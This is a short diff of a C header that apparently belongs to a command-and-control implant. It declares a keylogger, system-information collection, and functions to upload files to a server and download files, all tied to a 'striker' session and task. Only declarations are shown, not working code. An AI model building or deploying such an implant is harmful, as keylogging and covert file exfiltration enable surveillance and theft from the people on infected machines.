@@ -107,17 +107,14 @@ int http_post(char *url, cJSON *data, buffer *body);
   size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);
 #endif
 
-// Extract the host and port in a URL.
-void get_url_host_port(char *url, char *host, int *port);
+// Download a file from given URL and write top given file object. Returns 0 on success.
+int web_download(char *url, FILE *wfo);
 
 // Return a json object containing system information.
 cJSON *sysinfo();
 
 // Handles task for uploading file to server. Returns 0 on success.
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);
-
-// Download a file from `url` and save to `wfo`. Returns 0 on success.
-short int download_file(char *url, FILE *wfo, buffer *result_buff);
 
 // Starts the keylogger
 void keymon(session *striker, task *tsk);
